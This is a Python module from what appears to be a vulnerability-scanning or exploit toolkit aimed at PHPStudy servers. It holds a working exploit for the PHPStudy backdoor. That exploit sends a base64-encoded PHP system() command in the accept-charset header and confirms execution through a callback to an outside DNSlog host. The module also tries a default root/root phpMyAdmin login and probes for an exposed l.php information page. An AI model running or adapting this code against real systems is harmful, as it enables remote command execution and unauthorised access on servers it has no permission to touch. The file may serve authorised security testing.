from util.ExpRequest import ExpRequest,Output
from operator import methodcaller
from ClassCongregation import Dnslog#通过Dnslog判断
import base64
import time
class PHPStudy():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.status = env.get('status')

    def PHPStudyBackdoor(self):
        DL = Dnslog() #申请dnslog地址
        appName = 'PHPStudy'
        pocname = 'PHPStudyBackdoor'
        path = '/index.php'
        method = 'get'
        desc = 'PHPStudyBackdoor脚本漏洞'
        payload = ('''system("ping {}");''').format(DL.dns_host())
        payload = base64.b64encode(payload.encode('utf-8'))
        Headers = {
            'Sec-Fetch-Mode' : 'navigate',
            'Sec-Fetch-User' : '?1',
            'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Sec-Fetch-Site' : 'none',
            'accept-charset' : payload
        }
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            exprequest.get(self.url+path, headers=Headers, timeout=self.timeout, verify=False)
            time.sleep(2)
            if DL.result():
                info = "存在phpStudyBackdoor脚本漏洞, Payload:{}".format(payload)
                output.echo_success(method, info)
                self.status = 'success'
            else:
                output.fail()
        except Exception as error:
            output.error_output(str(error))

    def PHPStudyphpmyadmin(self):
        appName = 'PHPStudy'
        pocname = 'PHPStudyphpmyadmin'
        path = "/phpmyadmin/index.php"
        method = 'post'
        desc = 'phpstudy_phpmyadmin默认密码漏洞'
        payload = {
            "pma_username": "root",
            "pma_password": "root",
            "server": "1",
            "target": "index.php"
        }
        Headers = {
            'Accept' : '*/*',
            'Content-Type' : 'application/x-www-form-urlencoded'
        }
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            resp = exprequest.post(self.url+path, data=payload, headers=Headers, timeout=self.timeout, verify=False).text
            resp2 = exprequest.get(self.url+path, headers=Headers, timeout=self.timeout, verify=False).text

            if resp2.lower().find('navigation.php')!=-1 and resp.lower().find('frame_navigation')!=-1:
                info = "存在phpstudy_phpmyadmin默认密码漏洞"
                output.echo_success(method, info)
                self.status = 'success'
            else:
                output.fail()
        except Exception as error:
            output.error_output(str(error))

    def PHPStudyProbe(self):
        appName = 'PHPStudy'
        pocname = 'PHPStudyProbe'
        path = '/l.php'
        method = 'get'
        desc = 'PHPStudy探针泄露漏洞'
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            resp = exprequest.get(self.url+path, timeout=self.timeout, verify=False).text

            if resp.lower().find('php_version')!=-1 and resp.lower().find('phpstudy')!=-1:
                info = "存在phpstudy探针泄露漏洞"
                output.echo_success(method, info)
                self.status = 'success'
            else:
                output.fail()
        except Exception as error:
            output.error_output(str(error))

def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpPHPStudy = PHPStudy(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpPHPStudy, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpPHPStudy.status
    else:#调用所有函数
        for func in dir(PHPStudy):
            if not func.startswith("__"):
                methodcaller(func)(ExpPHPStudy)
                result_list.append(func+' -> '+ExpPHPStudy.status)
                ExpPHPStudy.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)


